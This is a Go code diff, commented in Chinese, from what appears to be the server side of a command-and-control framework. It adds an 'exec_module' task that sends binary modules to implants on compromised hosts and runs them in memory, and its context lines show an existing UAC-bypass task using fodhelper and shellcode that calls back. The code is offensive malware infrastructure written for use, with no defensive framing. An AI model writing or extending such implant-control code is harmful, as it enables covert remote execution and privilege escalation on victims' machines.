@@ -101,6 +101,13 @@ const (
 
 	// TaskTypeUACBypass UAC 提权（fodhelper + 内存执行 shellcode 回连上线）。
 	TaskTypeUACBypass = "uac_bypass"
+
+	// TaskTypeExecModule 按需加载内存模块（v1.4.0 S4）。
+	//
+	// Data 里是 moduleabi.ArgumentHeader 的 JSON（含一次性 token），**不含模块二进制**：
+	// 二进制走 TypeModuleData 帧单独下发。这样任务表/任务列表/SSE 里只会出现一个短 token，
+	// 不会出现多 MB 的 base64 —— 后者会让"任何能读任务列表的人"都拿到模块字节。
+	TaskTypeExecModule = "exec_module"
 )
 
 type TaskParams struct {
@@ -422,6 +429,27 @@ func (m *Manager) CreateFilelessExec(sessionID, kind, payloadB64, args, entry st
 	return m.Create(sessionID, TaskParams{
 		TaskType: TaskTypeFilelessExec,
 		Data:     string(raw),
+	})
+}
+
+// CreateExecModule 创建"按需加载内存模块"任务（v1.4.0 S4）。
+//
+// dataJSON 是 moduleabi.ArgumentHeader 的 JSON（module_id/token/sha256/size/abi/args_json）。
+// 模块二进制**不在这里**：它由 TaskPusher.PushModuleBlob 以 TypeModuleData 帧先下行，
+// 植入端按 token 暂存，任务执行时按 token 取出（取出即删 = 一次性）。
+//
+// 为什么任务只带 token 而不是带上字节：
+//   - 任务表是持久化的（sqlite）并且会被列到接口/SSE/审计日志里，多 MB 的模块
+//     会让这些路径全部变重，且等于把"模块"这份资产广播给所有能读任务的人；
+//   - token 把"授权"与"字节"解耦：授权是一次性的、可审计的、会过期的，字节只出现
+//     在它该出现的那一次下行里。
+func (m *Manager) CreateExecModule(sessionID, dataJSON string) (*types.TaskInfo, error) {
+	return m.Create(sessionID, TaskParams{
+		TaskType: TaskTypeExecModule,
+		Data:     dataJSON,
+		// 默认 120s：模块执行受植入端 heavyExecTimeout（180s）约束，这里略小于它，
+		// 让服务端先超时（结果回来晚了也不会把已完成的任务标记成失败）。
+		Timeout: 120,
 	})
 }
 
